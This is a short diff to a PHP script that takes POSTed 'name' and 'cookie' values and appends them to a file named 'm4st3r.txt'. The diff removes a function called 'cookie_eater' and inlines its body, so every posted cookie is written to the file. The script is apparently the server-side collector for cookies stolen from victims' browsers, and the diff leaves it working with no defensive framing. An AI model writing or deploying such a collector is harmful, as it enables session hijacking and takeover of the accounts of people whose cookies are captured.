@@ -17,18 +17,13 @@
 $name = $_POST['name'];
 $cookie = $_POST['cookie'];
 $fifo = fopen('m4st3r.txt', 'a');
-function cookie_eater($name, $cookie){
+
+if (is_null($cookie) == FALSE) {
     fwrite($fifo, "----- [".$name."] -----\n");
     fwrite($fifo, $cookie);
     fwrite($fifo, "\n----- [END] -----\n\n");
 
     fclose($fifo);
-}
-if (is_null($name) == FALSE) {
-    cookie_eater($name, $cookie);
-}
-elseif (is_null($cookie) == FALSE) {
-    cookie_eater($name, $cookie);
 }
 
 ?>
